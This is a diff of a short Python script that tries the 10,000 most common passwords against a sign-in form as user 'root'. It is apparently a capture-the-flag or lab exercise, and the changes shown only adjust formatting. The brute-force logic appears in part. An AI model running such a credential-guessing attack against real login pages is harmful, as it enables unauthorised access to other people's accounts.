@@ -5,7 +5,8 @@ import argparse
 import requests
 
 URL = None
-PARAMS = {"page":"signin", "Login":"Login", "username":"root"}
+PARAMS = {"page": "signin", "Login": "Login", "username": "root"}
+
 
 def check(password):
     PARAMS["password"] = password
@@ -14,8 +15,10 @@ def check(password):
         return True
     return False
 
+
 def find_file_path_from_current_dir():
     return glob.glob("./**/" + "10k-most-common.txt", recursive=True)[0]
+
 
 def main():
     with open(find_file_path_from_current_dir(), "r") as file:
@@ -29,6 +32,7 @@ def main():
                     print(f"Nope for => {password}")
             else:
                 break
+
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="Find the right password")
